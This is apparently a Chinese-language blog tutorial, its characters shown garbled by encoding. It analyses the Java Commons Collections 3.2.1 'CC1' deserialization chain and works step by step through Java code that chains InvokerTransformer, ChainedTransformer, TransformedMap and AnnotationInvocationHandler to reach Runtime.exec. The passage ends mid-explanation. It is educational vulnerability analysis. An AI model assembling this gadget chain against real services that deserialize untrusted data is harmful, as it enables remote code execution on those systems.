<!DOCTYPE html>
<html lang="zh-CN">
    
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
    <meta name="description" content="CommonsCollectionsååºåˆ—åŒ–é“¾1" />
    <meta name="hexo-theme-A4" content="v1.8.2" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>v2ish1yan</title>

    
        
<link rel="stylesheet" href="/css/a11y-dark.min.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--æ³¨æ„ï¼šé¦–é¡µæ—¢ä¸æ˜¯postä¹Ÿä¸æ˜¯page-->
        
            
<link rel="stylesheet" href="/css/waline.css">

        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--è¿”å›é¡¶éƒ¨css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--ç›®å½•-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    
    

<meta name="generator" content="Hexo 6.3.0"></head>
    
    <style>
        :root {
            --waline-theme-color: #000000; 
            --waline-color: #000000; 
            --waline-border-color: #000000; 
            --waline-white: #000000; 
            --waline-bgcolor-light: #ffffff;  
        }
        body {
            color: #000000;
            background: #e4e4e4;
        }
        .post-md code {
            background: #212425;
            color: white; 
        }
        .year-font-color {
            color: #000000 !important;
        }
        .wl-card span.wl-nick {
            color: #000000; 
        }
        .wl-card .wl-badge {
            border: 1px solid #000000;
            color: #000000; 
        }
        .wl-btn {
            border: 1px solid #000000; 
            color:  #000000;  
        }
        .wl-btn.primary {
            color: #ffffff; 
        }
        .wl-header label {
            color: #000000;
        }
        a {
            color: rgb(239, 112, 96);
        }

        .post-md a {
            color: rgb(239, 112, 96);
        }

        .nav li a {
            color: rgb(239, 112, 96);
        }

        .archive-main a:link {
            color: rgb(239, 112, 96);
        }
        .archive-main a:visited {
            color: rgb(239, 112, 96); 
        }

        .archive li span {
            color: #000000;
        }

        .post-main-title {
            color: #000000;
        }

        .post-md h1,
        .post-md h2,
        .post-md h3,
        .post-md h4,
        .post-md h5,
        .post-md h6 {
            color: #000000;
        }

        [data-waline] p {
            color: #000000;
        }
        [data-waline] a {
            color: #000000;
        } 
        .wl-sort li.active {
            color: #000000;
        }

        .wl-card .wl-meta>span {
            background: #ffffff;
        }

        .paper {
            background: #e4e4e4;
        }

        .index-main {
            background: #ffffff;
        }

        .paper-main {
            background: #ffffff;
        }

        .wl-panel {
            background: #ffffff;
        }

        .archive li:nth-child(odd) {
            background: #ffffff;
            ;
        }

        .archive li:nth-child(even) {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(odd) td {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(even) td {
            background: #ffffff;
        }

    
        .progress-wrap::after {
            color: #000000; /* ç®­å¤´çš„é¢œè‰² */
        }
        .progress-wrap svg.progress-circle path {
	        stroke: #000000; /* è¾¹æ¡†çš„é¢œè‰² */
        }
        .progress-wrap::before {
	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* é¼ æ ‡æ»‘è¿‡çš„ç®­å¤´é¢œè‰² */
         }

         .left-toc-container::-webkit-scrollbar-thumb {
            background-color: #000000; /* è®¾ç½®æ»šåŠ¨æ¡æ‹–åŠ¨å—çš„é¢œè‰² */
        }

        .bs-docs-sidebar .nav>.active>a,
        .bs-docs-sidebar .nav>li>a:hover,
        .bs-docs-sidebar .nav>li>a:focus {
            color: rgb(239, 112, 96);
            border-left-color: rgb(239, 112, 96);
        }
        .bs-docs-sidebar .nav>li>a {
            color:  #000000;
        }
    </style>

    
    <body>
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    
<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">v2ish1yan</a> 
            <span class="description">ä¸€åˆ‡éƒ½æ˜¯å…´è¶£ä½¿ç„¶</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">é¦–é¡µ</a></li>
            
        
            
                <li><a href="/list/">æ–‡ç« </a></li>
            
        
            
                <li><a href="/tags/">æ ‡ç­¾</a></li>
            
        
            
                <li><a href="/categories/">åˆ†ç±»</a></li>
            
        
            
                <li><a href="/about/">å…³äº</a></li>
            
        
            
                <li><a href="/friends/">å‹é“¾</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--è¯´æ˜æ˜¯æ–‡ç« posté¡µé¢-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            CommonsCollectionsååºåˆ—åŒ–é“¾1
        </div>
      
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="post-toc-text">ç¯å¢ƒå‡†å¤‡</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E9%80%A0%E6%88%90commons-collections%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="post-toc-text">ä¸ºä»€ä¹ˆä¼šé€ æˆcommons-collectionsçš„ååºåˆ—åŒ–æ¼æ´</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E9%93%BE%E5%AD%90%E7%9A%84%E5%88%86%E6%9E%90"><span class="post-toc-text">é“¾å­çš„åˆ†æ</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#InvokerTransformer-transform"><span class="post-toc-text">InvokerTransformer.transform()</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#TransformedMap-checkSetValue"><span class="post-toc-text">TransformedMap.checkSetValue()</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ChainedTransformer-transform-%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8"><span class="post-toc-text">ChainedTransformer.transform()é“¾å¼è°ƒç”¨</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ConstantTransformer-transform-%E8%BF%94%E5%9B%9E%E8%BE%93%E5%85%A5%E7%9A%84%E5%86%85%E5%AE%B9"><span class="post-toc-text">ConstantTransformer.transform()è¿”å›è¾“å…¥çš„å†…å®¹</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AbstractInputCheckedMapDecorator-MapEntry"><span class="post-toc-text">AbstractInputCheckedMapDecorator.MapEntry</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AnnotationInvocationHandler"><span class="post-toc-text">AnnotationInvocationHandler</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%9C%80%E7%BB%88%E7%9A%84%E9%93%BE%E5%AD%90"><span class="post-toc-text">æœ€ç»ˆçš„é“¾å­</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E6%80%BB%E7%BB%93"><span class="post-toc-text">æ€»ç»“</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%8F%82%E8%80%83%E8%BF%9E%E6%8E%A5"><span class="post-toc-text">å‚è€ƒè¿æ¥</span></a></li></ol>
            
        
        <h1 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h1><p>1.jkd8u65<br>ä¸‹è½½åœ°å€:<a target="_blank" rel="noopener" href="https://blog.lupf.cn/articles/2022/02/19/1645283454543.html">https://blog.lupf.cn/articles/2022/02/19/1645283454543.html</a></p>
<p>2.ä¸oracle jdkå¯¹åº”ç‰ˆæœ¬çš„sunåŒ…<br>ä¸‹è½½åœ°å€:<a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/af660750b2f4/src/share/classes/sun">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/af660750b2f4/src/share/classes/sun</a></p>
<p>3.Commons Collections 3.2.1ï¼ˆç‰ˆæœ¬é«˜äº†å¯èƒ½å°±æ²¡æ¼æ´äº†ï¼‰<br>ä½¿ç”¨mavenè‡ªåŠ¨å¯¼åŒ…ï¼Œåœ¨pom.xmlé‡Œè®¾ç½®<br>ä¾èµ–:</p>
<pre><code class="xml">&lt;dependencies&gt;
&lt;dependency&gt;
&lt;groupId&gt;commons-collections&lt;/groupId&gt;
&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
&lt;version&gt;3.2.1&lt;/version&gt;
&lt;/dependency&gt;
&lt;/dependencies&gt;
</code></pre>
<h1 id="ä¸ºä»€ä¹ˆä¼šé€ æˆcommons-collectionsçš„ååºåˆ—åŒ–æ¼æ´"><a href="#ä¸ºä»€ä¹ˆä¼šé€ æˆcommons-collectionsçš„ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šé€ æˆcommons-collectionsçš„ååºåˆ—åŒ–æ¼æ´"></a>ä¸ºä»€ä¹ˆä¼šé€ æˆcommons-collectionsçš„ååºåˆ—åŒ–æ¼æ´</h1><p>commons-collectionsåŒ…ä¸ºjavaæä¾›äº†ä¸€äº›æ¥å£ç±»ï¼Œå…¶ä¸­çš„æ¼æ´ç‚¹åœ¨äºä»–çš„<code>Transformer</code>æ¥å£ç±»<code>transform</code>æ–¹æ³•çš„ä¸€äº›å®ç°ç±»</p>
<h1 id="é“¾å­çš„åˆ†æ"><a href="#é“¾å­çš„åˆ†æ" class="headerlink" title="é“¾å­çš„åˆ†æ"></a>é“¾å­çš„åˆ†æ</h1><p>å› ä¸ºè¿™æ˜¯æˆ‘ç¬¬ä¸‰æ¬¡å†™é“¾å­çš„åˆ†æï¼Œæ‰€ä»¥æ²¡æœ‰æŒ‰ç…§ç™½æ—¥æ¢¦ç»„é•¿çš„æ€è€ƒé¡ºåºæ¥å†™</p>
<h2 id="InvokerTransformer-transform"><a href="#InvokerTransformer-transform" class="headerlink" title="InvokerTransformer.transform()"></a>InvokerTransformer.transform()</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡æ˜¯æ‰§è¡Œåˆ°</p>
<pre><code class="java">Runtime runtime = Runtime.getRuntime();
runtime.exec(&quot;calc&quot;);
</code></pre>
<p>ä½†æ˜¯å› ä¸ºRuntimeæ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£ï¼Œæ‰€ä»¥<strong>æ— æ³•åºåˆ—åŒ–å’Œååºåˆ—åŒ–</strong></p>
<p>åªèƒ½ä½¿ç”¨åå°„çš„æ–¹æ³•æ¥è®©Runtimeå¯¹è±¡å¯ä»¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå› ä¸ºClassç±»å®ç°äº†<code>Serializable</code>æ¥å£</p>
<p>è€Œä½¿ç”¨åå°„è¿›è¡Œå®ä¾‹åŒ–çš„è¯ï¼Œè™½ç„¶<code>Runtime</code>ç±»çš„æ„é€ å‡½æ•°ä¸º<code>private</code>ï¼Œä½†æ˜¯ä»–æä¾›äº†é™æ€å‡½æ•°<code>getRuntime()</code>æ¥è¿”å›ä¸€ä¸ªRuntimeå¯¹è±¡</p>
<p>æ™®é€šå†™æ³•:</p>
<pre><code class="java">Class c =Class.forName(&quot;java.lang.Runtime&quot;);
Method method = c.getMethod(&quot;getRuntime&quot;,null);
Runtime runtime =(Runtime) method.invoke(null,null);
</code></pre>
<p>çœ‹çœ‹<code>InvokerTransformer.transform()</code>çš„ä½œç”¨</p>
<blockquote>
<p>Transforms the input to result by invoking a method on the input.</p>
</blockquote>
<p>å®ƒçš„ä»£ç å®ç°ä¸º</p>
<pre><code class="java">public Object transform(Object input) &#123;
    if (input == null) &#123;
        return null;
    &#125;
    try &#123;
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);

    &#125;
    .....
    .....
    .....
</code></pre>
<p>æ‰€ä»¥ä»–çš„ä½œç”¨å°±æ˜¯å®ç°åå°„ï¼Œä½¿ç”¨<code>InvokerTransformer.transform()</code>è·å¾—å¯ä»¥ååºåˆ—åŒ–çš„<code>Runtime</code>å¯¹è±¡å¹¶æ‰§è¡Œ<code>exec()</code>æ–¹æ³•</p>
<p>è¿™é‡Œçš„è·å–çš„æ–¹æ³•çš„å‚æ•°è¦å†™å¯¹ï¼Œå¦åˆ™ä¼šæŠ¥é”™</p>
<pre><code class="java">Class c = Runtime.class;
//è·å–Classçš„getMethodæ–¹æ³•ï¼Œå¹¶ä½¿ç”¨è¿™ä¸ªæ–¹æ³•å»è·å¾—java.lang.Runtimeçš„getRuntimeé™æ€æ–¹æ³•
Method getRuntimemethod =(Method)  new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(c);
//è·å–Methodç±»çš„invokeæ–¹æ³•ï¼Œå»æ‰§è¡Œå½“å‰ä¹‹å‰è·å¾—çš„getRuntimeæ–¹æ³•ï¼Œæ¥å¾—åˆ°ä¸€ä¸ªRuntimeå¯¹è±¡
Runtime runtime = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[] &#123;Object.class,Object[].class&#125;,new Object[] &#123;null,null&#125;).transform(getRuntimemethod);
//è·å–Runtimeç±»çš„execæ–¹æ³•ï¼Œå¹¶ç”¨ä¹‹å‰å¾—åˆ°çš„Runtimeå¯¹è±¡æ¥æ‰§è¡Œ
new InvokerTransformer(&quot;exec&quot;,new Class[] &#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);
</code></pre>
<p>è¿™å°±æ˜¯CC1é“¾å­çš„ç»ˆç‚¹ï¼Œç„¶åå†åæ¨ï¼Œæ‰¾å“ªé‡Œè°ƒç”¨äº†transform()æ–¹æ³•ï¼Œä¸”è°ƒç”¨çš„å¯¹è±¡å¯ä»¥æ§</p>
<h2 id="TransformedMap-checkSetValue"><a href="#TransformedMap-checkSetValue" class="headerlink" title="TransformedMap.checkSetValue()"></a>TransformedMap.checkSetValue()</h2><p><code>TransformedMap.checkSetValue()</code>é‡Œè°ƒç”¨äº†transform()æ–¹æ³•</p>
<pre><code class="java">protected Object checkSetValue(Object value) &#123;
    return valueTransformer.transform(value);
&#125;
</code></pre>
<p>è¿™é‡Œçš„<code> valueTransformer</code>æ˜¯é€šè¿‡æ„é€ å‡½æ•°èµ‹å€¼çš„</p>
<pre><code class="java">protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
&#125;
</code></pre>
<p>è™½ç„¶æ„é€ å‡½æ•°ä¸ºprotectedï¼Œä½†æ˜¯ä»–æä¾›äº†é™æ€æ–¹æ³•æ¥è¿”å›å®ä¾‹</p>
<pre><code class="java">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;
    return new TransformedMap(map, keyTransformer, valueTransformer);
&#125;
</code></pre>
<p>å°†é“¾å­è¿æ¥èµ·æ¥</p>
<p>å› ä¸ºè¿™é‡Œåªèƒ½è°ƒç”¨ä¸€æ¬¡<code>transform()</code>ï¼Œä½†æ˜¯ä»å‰é¢å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬è¦æ‰§è¡Œå¾ˆå¤šæ¬¡<code>InvokerTransformer.transform()</code>ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨å…¶ä»–ç±»çš„<code>transform()</code>æ¥å°†è¿™äº›<code>transform()</code>ä¸²èµ·æ¥</p>
<h3 id="ChainedTransformer-transform-é“¾å¼è°ƒç”¨"><a href="#ChainedTransformer-transform-é“¾å¼è°ƒç”¨" class="headerlink" title="ChainedTransformer.transform()é“¾å¼è°ƒç”¨"></a>ChainedTransformer.transform()é“¾å¼è°ƒç”¨</h3><p>å¯ä»¥ä½¿ç”¨<code>ChainedTransformer.transform()</code></p>
<pre><code class="java">public Object transform(Object object) &#123;
    for (int i = 0; i &lt; iTransformers.length; i++) &#123;
        object = iTransformers[i].transform(object);
    &#125;
    return object;
&#125;
</code></pre>
<p>å¯ä»¥çœ‹å‡ºæ¥ï¼Œä»–æ˜¯å¯ä»¥å¾ªç¯è°ƒç”¨<code>iTransformers</code>æ•°ç»„å†…å¯¹è±¡çš„<code>transform()</code>æ–¹æ³•ï¼Œå¹¶å°†ä¸Šä¸€ä¸ªæ‰§è¡Œçš„ç»“æœä½œä¸ºä¸‹ä¸€ä¸ªæ‰§è¡Œçš„å¯¹è±¡</p>
<p>ä½†æ˜¯åˆæœ‰é—®é¢˜äº†ï¼Œå› ä¸ºåœ¨ä¸Šé¢çš„InvokerTransformer.transform()ï¼Œæˆ‘æ˜¯ä½¿ç”¨<code>Class c = Runtime.class</code>æ¥å¼€å¤´çš„ï¼Œä»–æ²¡æœ‰æ‰§è¡Œtransformæ–¹æ³•ã€‚è¿™åˆå¾—ä½¿ç”¨å¦å¤–ä¸€ä¸ªç±»äº†</p>
<h3 id="ConstantTransformer-transform-è¿”å›è¾“å…¥çš„å†…å®¹"><a href="#ConstantTransformer-transform-è¿”å›è¾“å…¥çš„å†…å®¹" class="headerlink" title="ConstantTransformer.transform()è¿”å›è¾“å…¥çš„å†…å®¹"></a>ConstantTransformer.transform()è¿”å›è¾“å…¥çš„å†…å®¹</h3><pre><code class="java">public Object transform(Object input) &#123;
    return iConstant;
&#125;
</code></pre>
<p>ç»™ä»–è¾“å…¥å•¥ï¼Œä»–å°±è¿”å›å•¥ï¼Œæ‰€ä»¥å°±åˆšå¥½ç¬¦åˆäº†æˆ‘ä»¬çš„éœ€æ±‚</p>
<p>æœ€é‡è¦çš„æ˜¯ï¼Œä¸Šé¢è¿™ä¸¤ä¸ªç±»ï¼Œéƒ½å®ç°äº†<code>Serializable</code>æ¥å£ï¼Œå¯ä»¥åºåˆ—åŒ–ã€ååºåˆ—åŒ–</p>
<p>ç„¶åå°±å˜æˆäº†ä¸‹é¢çš„ä»£ç </p>
<pre><code class="java">ChainedTransformer chainTransformer = new ChainedTransformer(new Transformer[]&#123;
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
    new InvokerTransformer(&quot;invoke&quot;,new Class[] &#123;Object.class,Object[].class&#125;,new Object[] &#123;null,null&#125;),
    new InvokerTransformer(&quot;exec&quot;,new Class[] &#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
&#125;);
Map&lt;?,?&gt; map=new HashMap&lt;&gt;();
Map a = TransformedMap.decorate(map,null,chainTransformer);
</code></pre>
<p>ä½†æ˜¯checkSetValueæ˜¯ä¸ªprotectedæ–¹æ³•ï¼Œæ‰€ä»¥å¾—æ‰¾ä¸€ä¸‹è¿™ä¸ªç±»é‡Œï¼Œæœ‰æ²¡æœ‰publicçš„æ–¹æ³•è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•</p>
<h2 id="AbstractInputCheckedMapDecorator-MapEntry"><a href="#AbstractInputCheckedMapDecorator-MapEntry" class="headerlink" title="AbstractInputCheckedMapDecorator.MapEntry"></a>AbstractInputCheckedMapDecorator.MapEntry</h2><p>åœ¨AbstractInputCheckedMapDecoratorç±»çš„<code>MapEntry</code>é™æ€ç±»é‡Œ</p>
<p>åœ¨ä»–çš„<code>setValue</code>æ–¹æ³•é‡Œè°ƒç”¨äº†<code>checkSetValue</code></p>
<pre><code class="java">public Object setValue(Object value) &#123;
    value = parent.checkSetValue(value);
    return entry.setValue(value);
&#125;
</code></pre>
<p>å› ä¸º<code>MapEntry</code>ç»§æ‰¿äº†<code>AbstractMapEntryDecorator</code>ï¼Œè€Œ<code>AbstractMapEntryDecorator</code>åˆå®ç°äº†Map.Entryæ¥å£</p>
<p>æ‰€ä»¥åœ¨è¿™é‡Œä»–æ˜¯å¯¹Map.Entryæ¥å£ç±»é‡Œ<code>setValue()</code>çš„å®ç°</p>
<p>åŒæ—¶ï¼Œ<code>parent.checkSetValue</code>ä¸º<code>AbstractInputCheckedMapDecorator</code>ç±»é‡Œçš„ä¸€ä¸ªæŠ½è±¡æ–¹æ³•ï¼Œè€Œ<code>TransformedMap</code>ç±»åˆç»§æ‰¿äº†<code>AbstractInputCheckedMapDecorator</code>ç±»ã€‚æ‰€ä»¥æœ€ç»ˆæ‰§è¡Œçš„è¿˜æ˜¯<code>TransformedMap.checkSetValue()</code></p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦é€šè¿‡entryç±»è¿›è¡Œéå†ï¼Œç„¶åå¯¹entryæ‰§è¡ŒsetValueå°±å¯ä»¥æ‰§è¡Œåˆ°è¿™é‡Œçš„<code>parent.checkSetValue</code></p>
<p>&lt;Map,Entry&lt;K,V&gt;&gt; entrySet() å°†Mapé›†åˆè½¬æ¢æˆseté›†åˆï¼Œæ‰€ä»¥è°ƒç”¨entrySet()çš„mapå¯¹è±¡éœ€è¦æœ‰å€¼</p>
<pre><code class="java">new ConstantTransformer(Runtime.class),
new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
new InvokerTransformer(&quot;invoke&quot;,new Class[] &#123;Object.class,Object[].class&#125;,new Object[] &#123;null,null&#125;),
new InvokerTransformer(&quot;exec&quot;,new Class[] &#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
&#125;);

Map&lt;Object,Object&gt; map=new HashMap&lt;&gt;();

map.put(&quot;k&quot;,&quot;v&quot;);

Map&lt;Object,Object&gt; transformermap = TransformedMap.decorate(map,null,chainTransformer);

for(Map.Entry entry:transformermap.entrySet())&#123;
    entry.setValue(chainTransformer);
&#125;
</code></pre>
<p>è¿™æ ·CC1é“¾çš„ååŠæ®µå°±æˆåŠŸäº†</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202303131226298.png" alt="image-20230313122615116"></p>
<p>ç„¶åå°±æ˜¯æ‰¾å“ªé‡Œè°ƒç”¨äº†<code>setValue</code></p>
<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>è¿™ä¸ªç±»é‡Œè°ƒç”¨<code>setValue()</code>ï¼Œè€Œä¸”è¿˜æ˜¯åœ¨<code>readObject()</code>é‡Œï¼</p>
<pre><code class="java">private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException &#123;
    s.defaultReadObject();

    // Check to make sure that types have not evolved incompatibly

    AnnotationType annotationType = null;
    try &#123;
        annotationType = AnnotationType.getInstance(type);
    &#125; catch(IllegalArgumentException e) &#123;
        // Class is no longer an annotation type; time to punch out
        throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
    &#125;

    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();

    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;
        String name = memberValue.getKey();
        Class&lt;?&gt; memberType = memberTypes.get(name);
        if (memberType != null) &#123;  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) ||
                  value instanceof ExceptionProxy)) &#123;
                memberValue.setValue(
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(
                        annotationType.members().get(name)));
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<p>ä»–æ˜¯å¯¹<code>memberValues</code>è¿›è¡Œéå†ï¼Œå»æŸ¥çœ‹æ„é€ å‡½æ•°</p>
<pre><code class="java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;
    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();
    if (!type.isAnnotation() ||
        superInterfaces.length != 1 ||
        superInterfaces[0] != java.lang.annotation.Annotation.class)
        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);
    this.type = type;
    this.memberValues = memberValues;
&#125;
</code></pre>
<p>åªè¦æŠŠmemberValuesçš„å€¼æ”¹ä¸ºä¸Šé¢çš„<code>transformermap</code>çš„å€¼å°±å¯ä»¥</p>
<p>ç„¶åtypeå‚æ•°å°±æ˜¯éœ€è¦ä¸€ä¸ªç»§æ‰¿<code>Annotation</code>æ¥å£çš„ç±»ï¼Œä¹Ÿå°±æ˜¯æ³¨é‡Šç±»ï¼Œåƒ<code>Override</code>é‚£äº›</p>
<p>ä½†æ˜¯è¿™ä¸ªç±»æ²¡æœ‰æ ‡æ³¨ä¿®é¥°ç¬¦ï¼Œæ‰€ä»¥é»˜è®¤ä¸ºdefault</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero%2F202211012342563.png" alt="image-20221101234156467"></p>
<p>æ‰€ä»¥è¿™é‡Œåªèƒ½ä½¿ç”¨åå°„æ¥å®ä¾‹åŒ–è¿™ä¸ªç±»</p>
<pre><code class="java">ChainedTransformer chainTransformer = new ChainedTransformer(new Transformer[]&#123;
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
    new InvokerTransformer(&quot;invoke&quot;,new Class[] &#123;Object.class,Object[].class&#125;,new Object[] &#123;null,null&#125;),
    new InvokerTransformer(&quot;exec&quot;,new Class[] &#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
&#125;);

Map&lt;Object,Object&gt; map=new HashMap&lt;&gt;();

map.put(&quot;k&quot;,&quot;v&quot;);

Map&lt;Object,Object&gt; transformermap = TransformedMap.decorate(map,null,chainTransformer);

Class annotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);

Constructor constructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);

constructor.setAccessible(true);

Object annotationInvocationHandler  = constructor.newInstance(Override.class,transformermap);
</code></pre>
<p>ç„¶åå†çœ‹ä¸€ä¸‹<code>AnnotationInvocationHandler.readObject</code>é‡Œï¼Œéœ€è¦è¾¾æˆä»€ä¹ˆæ¡ä»¶æ‰èƒ½å¤Ÿæ‰§è¡Œåˆ°<code>setValue()</code></p>
<pre><code class="java">AnnotationType annotationType = null;
try &#123;
    annotationType = AnnotationType.getInstance(type);
&#125; catch(IllegalArgumentException e) &#123;
    // Class is no longer an annotation type; time to punch out
    throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
&#125;
</code></pre>
<p>å°†typeå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ„é€ å‡½æ•°ä¼ å¦‚çš„<code> Annotation</code>å­ç±»è¿›è¡Œå®ä¾‹åŒ–</p>
<pre><code class="java">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();
</code></pre>
<p>è·å–<code> Annotation</code>å­ç±»å®ä¾‹çš„æˆå‘˜æ–¹æ³•é”®å€¼å¯¹</p>
<pre><code class="java">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;
    String name = memberValue.getKey();
    Class&lt;?&gt; memberType = memberTypes.get(name);
    if (memberType != null) &#123;  // i.e. member still exists
        Object value = memberValue.getValue();
        if (!(memberType.isInstance(value) ||
              value instanceof ExceptionProxy)) &#123;
            memberValue.setValue(
                new AnnotationTypeMismatchExceptionProxy(
                    value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(
                    annotationType.members().get(name)));
        &#125;
    &#125;
&#125;
</code></pre>
<p>å°†<code>memberValues</code>çš„Mapé›†åˆè½¬æ¢ä¸ºSeté›†åˆè¿›è¡Œéå†ï¼Œç„¶åå–<code>memberValues</code>å³ä¸Šé¢çš„<code>transformermap</code>çš„keyå€¼ï¼Œç„¶ååœ¨<code> Annotation</code>å­ç±»å®ä¾‹é‡Œé¢æ ¹æ®å–å¾—çš„keyå€¼æŸ¥æ‰¾æˆå‘˜æ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¿›å…¥ç¬¬ä¸€ä¸ªifè¯­å¥ã€‚</p>
<p>ç„¶ååˆ¤æ–­valueèƒ½å¦è½¬æ¢ä¸º<code>memberType</code>å¯¹åº”çš„ç±»ï¼Œå¦‚æœä¸èƒ½è½¬æ¢ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¿›å…¥ç¬¬äºŒä¸ªifè¯­å¥ã€‚æˆ–è€…æ˜¯valueæ˜¯<code>ExceptionProxy</code>ç±»çš„å®ä¾‹</p>
<blockquote>
<p><strong>obj.instanceof(class)</strong></p>
<p><strong>ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªå¯¹è±¡æ˜¯ä¸æ˜¯è¿™ç§ç±»å‹ï¼Œ</strong></p>
